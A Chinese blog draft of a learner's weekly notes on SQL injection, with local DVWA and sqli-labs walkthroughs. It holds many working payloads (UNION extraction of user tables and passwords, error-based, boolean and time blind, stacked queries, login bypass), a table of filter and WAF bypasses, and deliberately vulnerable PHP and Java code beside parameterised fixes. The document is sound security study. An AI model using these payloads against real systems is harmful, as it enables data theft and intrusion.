+++
date = '2026-10-05T00:15:00+08:00'
draft = true
title = 'AI写的SQL教学'
tags = ['SQL']
categories = ['SQL']
+++

## 目录

<!-- TOC -->

- [前言：为什么第二周要啃 SQL 注入](#前言为什么第二周要啃-sql-注入)
- [SQL 注入漏洞如何产生](#一sql-注入漏洞如何产生)
- [SQL 注入有什么危害](#二sql-注入有什么危害)
- [如何发现 SQL 注入](#三如何发现-sql-注入)
  - [3.1 黑盒手工发现思路](#31-黑盒手工发现思路)
  - [3.2 报错特征](#32-报错特征)
  - [3.3 工具辅助发现](#33-工具辅助发现)
  - [3.4 代码审计发现](#34-代码审计发现)
- [如何利用 SQL 注入（含进阶利用）](#四如何利用-sql-注入含进阶利用)
  - [4.1 判断注入类型](#41-判断注入类型)
  - [4.2 判断闭合方式](#42-判断闭合方式)
  - [4.3 判断列数](#43-判断列数)
  - [4.4 联合查询利用](#44-联合查询利用)
  - [4.5 报错注入](#45-报错注入)
  - [4.6 布尔盲注](#46-布尔盲注)
  - [4.7 时间盲注](#47-时间盲注)
  - [4.8 堆叠查询](#48-堆叠查询)
  - [4.9 二次注入](#49-二次注入)
  - [4.10 宽字节注入](#410-宽字节注入)
  - [4.11 HTTP 头注入与 JSON 注入](#411-http-头注入与-json-注入)
  - [4.12 带外注入 OOB](#412-带外注入-oob)
- [防御方式](#五防御方式)
  - [5.1 首选：参数化查询/预编译](#51-首选参数化查询预编译)
  - [5.2 输入验证与白名单](#52-输入验证与白名单)
  - [5.3 最小权限](#53-最小权限)
  - [5.4 错误处理](#54-错误处理)
  - [5.5 ORM 与查询构造器](#55-orm-与查询构造器)
  - [5.6 WAF、RASP 与监控](#56-wafrasp-与监控)
  - [5.7 代码审计与安全测试](#57-代码审计与安全测试)
- [不完备防御的绕过手段](#六不完备防御的绕过手段)
- [靶场实操记录](#七靶场实操记录)
  - [7.1 DVWA SQL Injection Low](#71-dvwa-sql-injection-low)
  - [7.2 DVWA SQL Injection Medium](#72-dvwa-sql-injection-medium)
  - [7.3 sqli-labs Less-1 联合注入](#73-sqli-labs-less-1-联合注入)
  - [7.4 sqli-labs Less-8 布尔盲注](#74-sqli-labs-less-8-布尔盲注)
  - [7.5 sqli-labs Less-9 时间盲注](#75-sqli-labs-less-9-时间盲注)
- [源码对比分析](#八源码对比分析)
  - [8.1 脆弱 PHP 代码](#81-脆弱-php-代码)
  - [8.2 安全 PHP 代码](#82-安全-php-代码)
  - [8.3 脆弱 Java 代码](#83-脆弱-java-代码)
  - [8.4 安全 Java 代码](#84-安全-java-代码)
  - [8.5 源码对比结论](#85-源码对比结论)
- [本周学习总结](#九本周学习总结)
- [参考资料与后续计划](#参考资料与后续计划)

<!-- /TOC -->

summary: "第二周系统学习 SQL 注入：从漏洞产生、危害、发现、基础与进阶利用，到防御方式、绕过手段，并完成 DVWA 与 sqli-labs 靶场实操和源码对比。"
cover:
  image: "/images/web-security/week2/sql-injection-cover.png"
  alt: "SQL注入学习周报封面"
  caption: "图片路径后续替换"
---

> 免责声明：本文仅用于授权靶场、本地实验和 Web 安全学习。所有 payload 和思路请勿用于未授权系统。真实项目中请遵循授权、合规和最小影响原则。

<!--more-->

## 前言：为什么第二周要啃 SQL 注入

第一周我主要把 Web 安全的基础面铺开：HTTP、Cookie/Session、同源策略、常见漏洞分类、靶场环境搭建。到了第二周，我决定集中啃一个最经典、也最能训练“输入—处理—输出”思维的漏洞：SQL 注入。

SQL 注入看起来只是“在参数里加个单引号”，但真正学下来会发现，它背后涉及数据库、后端语言、框架、WAF、权限、错误处理、编码、盲注、二次注入等一整条链路。它不是背几个 payload 就能掌握的漏洞，而是一个非常适合建立 Web 安全方法论的入口。

这篇周报是我的学习记录，不是“攻击手册”。我会尽量把原理、发现方法、利用思路、防御方式和绕过手段讲清楚，但所有实验都只在本地 DVWA 和 sqli-labs 靶场完成。

![SQL注入学习路线图](/images/web-security/week2/sql-injection-roadmap.png)

> 图片路径后续替换：`/images/web-security/week2/sql-injection-roadmap.png`

## 一、SQL 注入漏洞如何产生

SQL 注入的本质是：**应用程序把用户可控输入当成了 SQL 语句的一部分，而没有把它当作纯数据来处理。**

一个典型的脆弱代码长这样：

```php
$id = $_GET['id'];
$sql = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $sql);
```

当用户传入正常的 `1` 时，SQL 是：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

当用户传入 `1' OR '1'='1` 时，SQL 变成：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

原本的“查询 id 为 1 的用户”被改写成“查询所有用户”。这就是最基础的 SQL 注入。

我总结 SQL 注入产生的核心条件有这些：

1. **用户输入被拼接进 SQL 语句**
   例如字符串拼接、格式化字符串、模板拼接。

2. **没有使用参数化查询/预编译**
   数据库无法区分“SQL 结构”和“用户数据”。

3. **输入校验不足**
   只做前端校验、只做长度校验、只做黑名单过滤，都不够。

4. **数据库权限过大**
   Web 账号如果拥有 `FILE`、`DROP`、`xp_cmdshell` 等权限，注入后果会被放大。

5. **错误信息直接回显**
   数据库报错会帮助攻击者判断闭合方式、列数、数据库类型和版本。

6. **动态表名、列名、ORDER BY、LIMIT 等位置处理不当**
   这些位置很多数据库驱动不能直接参数化，如果直接拼接，也会产生注入。

7. **二次注入**
   恶意数据先被存入数据库，后续在其他功能中又被拼接进 SQL 查询。

一句话：**只要“用户数据”混进了“SQL 代码”的位置，就有注入风险。**

## 二、SQL 注入有什么危害

SQL 注入的危害取决于数据库权限、应用架构和业务重要性。学习时不能只盯着“能不能爆出账号密码”，还要理解它可能造成什么级别的风险。

常见危害包括：

1. **数据泄露**
   读取用户表、订单表、管理员表、配置表、密钥表等敏感数据。

2. **认证绕过**
   通过 `OR '1'='1'`、注释符、联合查询等方式绕过登录校验。

3. **数据篡改与删除**
   修改价格、余额、权限、状态；严重时可删除表或库。

4. **权限提升**
   读取管理员凭据、修改角色字段、创建高权限用户。

5. **文件读写**
   在数据库权限和配置允许时，可能通过 `LOAD_FILE`、`INTO OUTFILE` 等读写文件。

6. **命令执行**
   在 SQL Server 等环境中，若开启 `xp_cmdshell` 等危险功能，可能进一步执行系统命令。

7. **横向移动**
   利用数据库凭据、内网连接、共享账号进一步渗透其他系统。

8. **业务中断与合规风险**
   数据被删、被加密、被勒索，或者泄露用户隐私，都会带来严重业务和合规后果。

9. **绕过风控与审计**
   注入点可能被用来篡改日志、伪造操作记录、绕过业务限制。

所以，SQL 注入不是“小漏洞”。它是可以直达数据核心的高危漏洞。

## 三、如何发现 SQL 注入

我发现 SQL 注入通常可以从“黑盒测试”和“白盒审计”两条路走。

### 3.1 黑盒手工发现思路

核心是观察：**输入不同内容后，页面、响应时间、状态码、报错、数据量是否发生变化。**

常见探测点：

- URL 参数：`?id=1`
- POST 表单：登录、搜索、筛选、排序
- Cookie：`Cookie: uid=1`
- HTTP 头：`User-Agent`、`Referer`、`X-Forwarded-For`
- JSON 参数：`{"id":1}`
- 隐藏字段、下拉框、分页参数、排序参数

基础探测 payload 示例，仅限靶场：

```sql
'
"
\
')
'))
1' AND '1'='1
1' AND '1'='2
1 AND 1=1
1 AND 1=2
1' ORDER BY 1--+
1' UNION SELECT NULL--+
```

观察点：

- 单引号是否报错？
- 双引号是否报错？
- 反斜杠是否报错？
- `AND 1=1` 与 `AND 1=2` 返回是否不同？
- 加 `ORDER BY` 是否报错，能否判断列数？
- 加 `UNION SELECT` 是否回显？
- 加时间函数是否延迟？
- 加布尔条件是否影响页面内容？

### 3.2 报错特征

不同数据库报错不同：

- MySQL：`You have an error in your SQL syntax`
- SQL Server：`Unclosed quotation mark after the character string`
- Oracle：`ORA-01756`
- PostgreSQL：`ERROR: syntax error at or near`

报错不是目的，但能帮助判断数据库类型和闭合方式。

### 3.3 工具辅助发现

在授权靶场中，可以用 sqlmap 辅助验证：

```bash
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --batch
```

但工具不能代替理解。很多时候 WAF、编码、盲注、二次注入、JSON 注入会让工具失效，还是需要手工分析。

### 3.4 代码审计发现

白盒审计时，我会重点搜索：

- `SELECT ... FROM ... WHERE ... $`
- `query(`、`exec(`、`execute(`
- `Statement`、`createStatement`
- `mysqli_query`、`mysql_query`
- `PDO::query`
- `ORDER BY`、`LIMIT`、表名、列名拼接
- `sprintf`、`format`、字符串模板

如果用户输入能一路传到这些位置，就值得重点跟踪。

## 四、如何利用 SQL 注入（含进阶利用）

再次强调：以下内容只用于本地靶场和授权测试。

### 4.1 判断注入类型

先判断是数字型还是字符型。

数字型：

```sql
?id=1 AND 1=1
?id=1 AND 1=2
```

字符型：

```sql
?id=1' AND '1'='1
?id=1' AND '1'='2
```

如果单引号报错，说明可能使用 `'$id'` 形式拼接。

### 4.2 判断闭合方式

常见闭合：

```sql
?id=1'
?id=1"
?id=1)
?id=1')
?id=1'))
```

注释掉剩余 SQL：

```sql
--+
-- -
#
```

例如：

```sql
?id=1' --+
?id=1') --+
```

### 4.3 判断列数

使用 `ORDER BY`：

```sql
?id=1' ORDER BY 1--+
?id=1' ORDER BY 2--+
?id=1' ORDER BY 3--+
```

直到报错，报错前一个数字就是列数。

也可以用：

```sql
?id=1' UNION SELECT NULL--+
?id=1' UNION SELECT NULL,NULL--+
?id=1' UNION SELECT NULL,NULL,NULL--+
```

### 4.4 联合查询利用

找到回显位后，可以读取数据库信息：

```sql
?id=-1' UNION SELECT 1,database(),version()--+
?id=-1' UNION SELECT 1,user(),@@datadir--+
```

查当前库的表：

```sql
?id=-1' UNION SELECT 1,group_concat(table_name),3
FROM information_schema.tables
WHERE table_schema=database()--+
```

查列：

```sql
?id=-1' UNION SELECT 1,group_concat(column_name),3
FROM information_schema.columns
WHERE table_name='users'--+
```

查数据：

```sql
?id=-1' UNION SELECT 1,username,password FROM users--+
```

### 4.5 报错注入

当页面不回显数据，但会显示数据库错误时，可以尝试报错注入。MySQL 中常见函数：

```sql
?id=1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+
?id=1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--+
```

思路是把查询结果拼进错误信息里。

### 4.6 布尔盲注

页面不显示数据，也不显示错误，但真假条件会影响页面内容时，可以用布尔盲注。

```sql
?id=1' AND length(database())=8--+
?id=1' AND substring(database(),1,1)='s'--+
?id=1' AND ascii(substring(database(),1,1))>100--+
```

通过不断猜字符，逐位还原数据。手工很慢，脚本会更快，但理解原理最重要。

### 4.7 时间盲注

页面完全无差异时，可以用时间延迟判断条件真假。

```sql
?id=1' AND IF(substring(database(),1,1)='s',sleep(3),0)--+
?id=1' AND IF(ascii(substring(database(),1,1))>100,sleep(3),0)--+
```

如果条件为真，页面延迟约 3 秒。SQL Server 可用 `WAITFOR DELAY`，PostgreSQL 可用 `pg_sleep()`。

### 4.8 堆叠查询

部分数据库驱动支持一次执行多条 SQL：

```sql
?id=1'; SELECT sleep(3)--+
```

堆叠查询是否可用，取决于数据库和驱动。它能扩大危害，但在真实环境中也可能造成破坏，所以只能在靶场验证。

### 4.9 二次注入

二次注入是“先存后打”：

1. 攻击者把恶意数据存入数据库，例如用户名 `admin'--`。
2. 应用后续把该数据取出，未参数化地拼进另一条 SQL。
3. 触发注入。

这类漏洞隐蔽性强，因为第一次输入时可能被转义，第二次使用时却恢复了危险语义。

### 4.10 宽字节注入

在 GBK 等宽字节字符集下，如果转义函数和数据库连接字符集不一致，可能出现宽字节注入。

典型思路是 `%df'` 让反斜杠被“吃掉”，单引号逃逸。防御关键是统一使用 UTF-8，并使用参数化查询，而不是依赖 `addslashes`。

### 4.11 HTTP 头注入与 JSON 注入

注入点不一定在 URL。Cookie、User-Agent、Referer、X-Forwarded-For、JSON 字段都可能进入 SQL。

例如 JSON：

```json
{"id":"1' OR '1'='1"}
```

如果后端直接把 `id` 拼进 SQL，同样会注入。

### 4.12 带外注入 OOB

当页面无回显、无报错、无时间差异时，可能考虑带外通道，例如 DNS 外带、HTTP 外带。它依赖数据库功能和网络权限，利用门槛较高。

## 五、防御方式

SQL 注入的防御不是“加一个过滤函数”这么简单。正确思路是：**让用户数据永远只作为数据，不进入 SQL 代码结构。**

### 5.1 首选：参数化查询/预编译

PHP PDO：

```php
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
$stmt->execute([':id' => $id]);
$rows = $stmt->fetchAll();
```

Java JDBC：

```java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, username);
ps.setString(2, password);
ResultSet rs = ps.executeQuery();
```

Python：

```python
cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

参数化查询的核心是：SQL 结构先编译，用户输入后绑定，数据库不会把输入当作 SQL 语法。

### 5.2 输入验证与白名单

对于类型固定的参数，强制类型转换：

```php
$id = (int)$_GET['id'];
```

对于排序字段、表名、列名，使用白名单：

```php
$allowed = ['id', 'username', 'created_at'];
$order = in_array($_GET['order'], $allowed, true) ? $_GET['order'] : 'id';
```

不要试图用黑名单过滤所有危险字符，黑名单很容易被绕过。

### 5.3 最小权限

Web 数据库账号只给必要权限：

- 只读业务库时，不要给写权限。
- 不要给 `FILE`、`DROP`、`CREATE USER`、`xp_cmdshell` 等权限。
- 不同业务使用不同数据库账号。
- 敏感表单独控制权限。

### 5.4 错误处理

生产环境不要回显 SQL 错误：

```php
ini_set('display_errors', 0);
error_log($e->getMessage());
```

给用户返回统一错误页，把详细信息写入日志。

### 5.5 ORM 与查询构造器

使用 ORM 或查询构造器通常能降低风险，但前提是不要拼接原生 SQL。例如：

```php
User::where('id', $id)->first();
```

如果写成 `User::whereRaw("id = $id")`，依然可能注入。

### 5.6 WAF、RASP 与监控

WAF 可以作为辅助，但不能作为唯一防线。RASP 可以在运行时检测危险查询。日志监控可以发现异常 SQL 模式。

### 5.7 代码审计与安全测试

- SAST：静态扫描字符串拼接 SQL。
- DAST：动态扫描注入点。
- 人工审计：重点看登录、搜索、导出、排序、分页、报表。
- 上线前安全测试：至少覆盖 OWASP Top 10。

## 六、不完备防御的绕过手段

这一节用于理解“为什么不能只靠过滤”。在靶场和 WAF 评估中，常见绕过思路包括：

| 不完备防御 | 绕过思路 | 示例 | 说明 |
|---|---|---|---|
| 过滤 `union select` | 注释、换行、大小写、内联注释 | `union/**/select`、`union%0aselect`、`union all select` | 只匹配连续字符串容易漏 |
| 过滤空格 | 注释、换行、制表符、括号 | `/**/`、`%09`、`%0a`、`+` | SQL 对空白字符容忍度高 |
| 过滤 `and/or` | 使用符号或等价表达式 | `&&`、`||`、`^`、`not`、`between` | 逻辑运算有多种写法 |
| 过滤单引号 | 十六进制、`char()`、数字型注入 | `0x61646d696e`、`char(97,100,109,105,110)` | 字符型可绕过，数字型本来就不需要引号 |
| 过滤逗号 | `join`、`offset`、`from for` | `substr(database() from 1 for 1)` | 逗号不是唯一分隔方式 |
| 过滤 `information_schema` | 查其他元数据表 | `mysql.innodb_table_stats`、`sys.schema_*` | MySQL 还有其他系统表 |
| 过滤关键字 | 大小写混合、URL 编码、双重编码 | `SeLeCt`、`%55nion`、`%2555nion` | 解码层级不一致会造成绕过 |
| 简单转义 | 宽字节、二次注入、字符集不一致 | `%df'` | 转义函数不能替代参数化 |
| WAF 规则 | 参数污染、分块传输、JSON 变形 | `id=1&id=2`、`Transfer-Encoding: chunked` | 协议层差异可能绕过 |
| 只防 GET | 改测 POST、Cookie、Header | `Cookie: uid=1'` | 注入点可能在任何输入源 |

重要结论：

1. **黑名单不是防御。**
   攻击者总能找到等价写法。

2. **转义不是万能。**
   `addslashes`、`mysqli_real_escape_string` 在字符集不一致、数字型、二次注入场景下可能失效。

3. **WAF 不是根因修复。**
   WAF 可以争取时间，但代码层必须参数化。

4. **参数化查询才是主防线。**
   再配合最小权限、错误处理、白名单和监控，才是完整防御。

   ## 七、靶场实操记录

本周我主要用了 DVWA 和 sqli-labs。环境是本地 Docker，所有操作都在授权靶场完成。

![DVWA与sqli-labs靶场环境](/images/web-security/week2/lab-environment.png)

> 图片路径后续替换：`/images/web-security/week2/lab-environment.png`

### 7.1 DVWA SQL Injection Low

目标：判断注入类型，联合查询读取用户数据。

步骤：

1. 输入 `1`，页面正常返回用户信息。
2. 输入 `1'`，页面报 SQL 语法错误，说明可能存在字符型注入。
3. 输入 `1' OR '1'='1`，返回多条用户记录。
4. 输入 `1' ORDER BY 2--+`，页面正常；`ORDER BY 3--+` 报错，判断列数为 2。
5. 输入 `-1' UNION SELECT 1,2--+`，找到回显位。
6. 输入 `-1' UNION SELECT user(),database()--+`，读取当前用户和数据库。
7. 输入 `-1' UNION SELECT user,password FROM users--+`，读取用户表数据。

关键 payload：

```sql
1'
1' OR '1'='1
1' ORDER BY 2--+
-1' UNION SELECT 1,2--+
-1' UNION SELECT user(),database()--+
-1' UNION SELECT user,password FROM users--+
```

截图占位：

![DVWA Low 单引号报错](/images/web-security/week2/dvwa-low-quote-error.png)

> 图片路径后续替换：`/images/web-security/week2/dvwa-low-quote-error.png`

![DVWA Low 联合查询结果](/images/web-security/week2/dvwa-low-union-result.png)

> 图片路径后续替换：`/images/web-security/week2/dvwa-low-union-result.png`

### 7.2 DVWA SQL Injection Medium

Medium 模式下前端变成了下拉框，但抓包后仍然可以修改 `id` 参数。这个级别让我意识到：**前端限制不是安全边界。**

步骤：

1. 正常选择 ID，抓包。
2. 修改 `id` 为 `1 OR 1=1`。
3. 观察返回结果是否变化。
4. 继续尝试联合查询和报错注入。

记录 payload：

```sql
1 OR 1=1
1 ORDER BY 2
-1 UNION SELECT 1,2
```

截图占位：

![DVWA Medium 抓包修改参数](/images/web-security/week2/dvwa-medium-burp.png)

> 图片路径后续替换：`/images/web-security/week2/dvwa-medium-burp.png`

### 7.3 sqli-labs Less-1 联合注入

Less-1 是经典字符型联合注入。

步骤：

1. `?id=1'` 报错。
2. `?id=1' order by 3--+` 正常，`order by 4--+` 报错，列数为 3。
3. `?id=-1' union select 1,2,3--+` 找到回显位。
4. 查库名和版本：

```sql
?id=-1' union select 1,database(),version()--+
```

5. 查表：

```sql
?id=-1' union select 1,group_concat(table_name),3
from information_schema.tables
where table_schema=database()--+
```

6. 查列：

```sql
?id=-1' union select 1,group_concat(column_name),3
from information_schema.columns
where table_name='users'--+
```

7. 查数据：

```sql
?id=-1' union select 1,username,password from users--+
```

截图占位：

![sqli-labs Less-1 联合注入](/images/web-security/week2/sqli-labs-less1-union.png)

> 图片路径后续替换：`/images/web-security/week2/sqli-labs-less1-union.png`

### 7.4 sqli-labs Less-8 布尔盲注

Less-8 页面不回显数据，也不显示报错，但真假条件会影响页面是否显示。

手工判断：

```sql
?id=1' and length(database())=8--+
?id=1' and substring(database(),1,1)='s'--+
```

如果页面正常，说明条件为真；如果异常，说明条件为假。通过逐字符猜解，可以还原数据库名、表名和字段值。

截图占位：

![sqli-labs Less-8 布尔盲注](/images/web-security/week2/sqli-labs-less8-boolean.png)

> 图片路径后续替换：`/images/web-security/week2/sqli-labs-less8-boolean.png`

### 7.5 sqli-labs Less-9 时间盲注

Less-9 页面无论真假都差不多，需要用时间判断。

```sql
?id=1' and if(substring(database(),1,1)='s',sleep(3),0)--+
```

如果首字符是 `s`，页面延迟约 3 秒。否则快速返回。时间盲注效率低，但很能说明“无回显也能注入”。

截图占位：

![sqli-labs Less-9 时间盲注](/images/web-security/week2/sqli-labs-less9-time.png)

> 图片路径后续替换：`/images/web-security/week2/sqli-labs-less9-time.png`

## 八、源码对比分析

这一周我特意把 DVWA 的脆弱代码和安全写法做了对比。理解源码后，很多 payload 为什么能成功就清楚了。

### 8.1 脆弱 PHP 代码

```php
<?php
$id = $_GET['id'];
$sql = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $sql);

while ($row = mysqli_fetch_assoc($result)) {
    echo $row['first_name'] . ' ' . $row['last_name'];
}
?>
```

问题：

1. `$_GET['id']` 直接进入 SQL。
2. 使用单引号包裹，字符型注入明显。
3. 没有类型转换。
4. 没有参数化。
5. 数据库错误可能直接回显。
6. 数据库账号权限可能过大。

### 8.2 安全 PHP 代码

```php
<?php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

if ($id === false) {
    http_response_code(400);
    exit('Invalid ID');
}

$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
$stmt->execute([':id' => $id]);
$rows = $stmt->fetchAll();

foreach ($rows as $row) {
    echo htmlspecialchars($row['first_name'] . ' ' . $row['last_name'], ENT_QUOTES, 'UTF-8');
}
?>
```

改进点：

1. 先做整数白名单校验。
2. 使用 PDO 预处理。
3. 参数绑定，用户输入不进入 SQL 结构。
4. 输出时使用 `htmlspecialchars` 防止 XSS。
5. 错误不直接回显给用户。

### 8.3 脆弱 Java 代码

```java
String username = request.getParameter("username");
String password = request.getParameter("password");

String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

登录处如果这样写，输入 `' OR '1'='1` 就可能绕过认证。

### 8.4 安全 Java 代码

```java
String username = request.getParameter("username");
String password = request.getParameter("password");

String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, username);
ps.setString(2, password);
ResultSet rs = ps.executeQuery();
```

关键区别：

- 脆弱代码：SQL 结构由字符串拼接决定。
- 安全代码：SQL 结构固定，参数只作为数据绑定。

### 8.5 源码对比结论

| 对比项 | 脆弱写法 | 安全写法 |
|---|---|---|
| SQL 构建 | 字符串拼接 | 预编译参数化 |
| 用户输入 | 直接进入 SQL | 绑定为参数 |
| 类型校验 | 无或不足 | 强制类型/白名单 |
| 错误处理 | 直接回显 | 统一错误页 + 日志 |
| 数据库权限 | 可能过大 | 最小权限 |
| 输出编码 | 可能缺失 | HTML 编码 |
| 可绕过性 | 高 | 低 |

## 九、本周学习总结

这周最大的收获是：**SQL 注入不是“payload 大全”，而是一种信任边界被打破的结果。**

我学到了：

1. SQL 注入的根因是用户输入进入 SQL 结构。
2. 危害从数据泄露到命令执行都有可能，取决于权限和环境。
3. 发现注入要观察报错、布尔差异、时间延迟、回显位。
4. 利用方式从联合查询、报错、布尔盲注、时间盲注到堆叠、二次、宽字节、HTTP 头注入。
5. 防御首选参数化查询，配合白名单、最小权限、错误处理、WAF、日志和审计。
6. 黑名单、简单转义、WAF 都不完备，不能作为唯一防线。
7. 源码审计能帮助我理解“为什么这个 payload 能打进去”。

遇到的困难：

- 盲注手工猜解很慢，容易失去耐心。
- 不同数据库函数差异大，需要查文档。
- 宽字节注入需要理解字符集和转义函数的关系。
- WAF 绕过不能死记 payload，要理解解析差异。

下周计划：

1. 继续学习 XSS、CSRF、SSRF，做横向对比。
2. 回头复习 SQL 注入的代码审计方法。
3. 尝试用 Python 写一个本地靶场盲注脚本，只用于授权环境。
4. 整理一份“SQL 注入防御 checklist”，用于以后代码审计。
5. 把 DVWA 和 sqli-labs 的截图补充完整，并替换本文图片路径。

## 参考资料与后续计划

- OWASP Top 10
- OWASP SQL Injection Prevention Cheat Sheet
- DVWA 官方文档
- sqli-labs 官方仓库
- PHP PDO 文档
- Java JDBC PreparedStatement 文档
- MySQL 官方文档

![本周学习总结与下一步计划](/images/web-security/week2/week2-summary.png)

> 图片路径后续替换：`/images/web-security/week2/week2-summary.png`

> 最后再次提醒：本文所有 payload 和绕过思路仅用于本地靶场、授权测试和安全学习。真实系统中请先获得书面授权，并遵循最小影响原则。